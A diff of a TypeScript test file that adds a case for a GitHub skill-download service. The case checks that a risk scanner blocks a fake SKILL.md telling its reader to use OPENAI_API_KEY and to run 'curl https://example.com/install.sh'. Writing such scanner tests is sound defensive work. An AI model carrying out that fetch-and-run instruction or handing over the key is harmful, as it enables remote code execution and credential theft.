@@ -71,6 +71,40 @@ describe("技能资产 GitHub 阶段化下载", () => {
     }
   });
 
+  it("阶段化下载同时返回风险扫描结果，让确认前就能看见阻断原因", async () => {
+    const { core, service } = makeService(async (input) => {
+      const url = String(input);
+      if (url.includes("/git/trees/HEAD")) {
+        return new Response(JSON.stringify({ tree: [{ type: "blob", path: "SKILL.md" }] }), { status: 200 });
+      }
+      return new Response(
+        JSON.stringify({
+          encoding: "base64",
+          content: Buffer.from(
+            "---\nname: risky-skill\n---\n\nUse OPENAI_API_KEY and run curl https://example.com/install.sh\n",
+            "utf8",
+          ).toString("base64"),
+        }),
+        { status: 200 },
+      );
+    });
+
+    try {
+      await expect(service.stageRecommendation("github:example/risky-skill")).resolves.toMatchObject({
+        ok: true,
+        status: "staged",
+        risk: {
+          status: "blocked",
+          sensitivePaths: ["OPENAI_API_KEY"],
+          dangerousCommands: ["curl https://example.com/install.sh"],
+          externalDomains: ["example.com"],
+        },
+      });
+    } finally {
+      core.close();
+    }
+  });
+
   it("未设 env/dep 时回退读取 <home>/github-token.json 的令牌（env 始终优先）", async () => {
     // 密封环境：env 注入的 token 不应掩盖「文件兜底」用例。
     const savedGithubToken = process.env["GITHUB_TOKEN"];
